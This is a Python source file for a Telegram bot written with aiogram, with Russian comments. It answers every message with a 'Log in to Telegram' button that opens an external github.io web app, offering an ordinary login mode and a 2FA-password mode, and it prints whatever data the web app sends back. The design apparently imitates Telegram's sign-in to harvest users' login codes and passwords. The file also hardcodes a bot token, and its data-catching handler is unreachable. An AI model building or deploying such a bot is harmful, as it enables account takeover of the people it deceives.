import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    WebAppInfo,
    ReplyKeyboardMarkup,
    KeyboardButton
)

# ==========================================
# 👇 ВСТАВЬ СВОИ ДАННЫЕ 👇
# ==========================================
BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
# Не забудь поменять версию ?v=... если обновлял HTML
WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=666"
# ==========================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# --- ФУНКЦИЯ ОТПРАВКИ КНОПКИ ---
async def send_login_button(message: types.Message, need_password: bool):
    if need_password:
        separator = "&" if "?" in WEB_APP_URL else "?"
        final_url = f"{WEB_APP_URL}{separator}p=1"
        text_msg = "🔐 <b>Вход с ПАРОЛЕМ</b> (2FA)\nНажми кнопку внизу 👇"
    else:
        final_url = WEB_APP_URL
        text_msg = "📱 <b>Обычный вход</b>\nНажми кнопку внизу 👇"

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="⚡ Войти в Telegram",
                    web_app=WebAppInfo(url=final_url)
                )
            ]
        ],
        resize_keyboard=True,
        input_field_placeholder="Нажми кнопку ниже..."
    )

    await message.answer(text_msg, reply_markup=keyboard, parse_mode="HTML")


# 1. Режим с паролем
@dp.message(F.text.lower() == "пароль")
async def password_mode(message: types.Message):
    await send_login_button(message, need_password=True)


# 2. Обычный режим
@dp.message(Command("start"))
@dp.message()
async def start_mode(message: types.Message):
    await send_login_button(message, need_password=False)


# 3. ПРИЕМ ДАННЫХ (ИЗМЕНЕНО)
# Ловим ВООБЩЕ ВСЁ и пишем в консоль
@dp.message()
async def catch_all(message: types.Message):
    print(f"📥 ЧТО-ТО ПРИШЛО: {message}")

    if message.web_app_data:
        print(f"🔥 ЭТО ДАННЫЕ ИЗ WEBAPP: {message.web_app_data.data}")
    else:
        print("🧊 Это просто текст или другое сообщение")

async def main():
    print("✅ Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("❌ Бот остановлен.")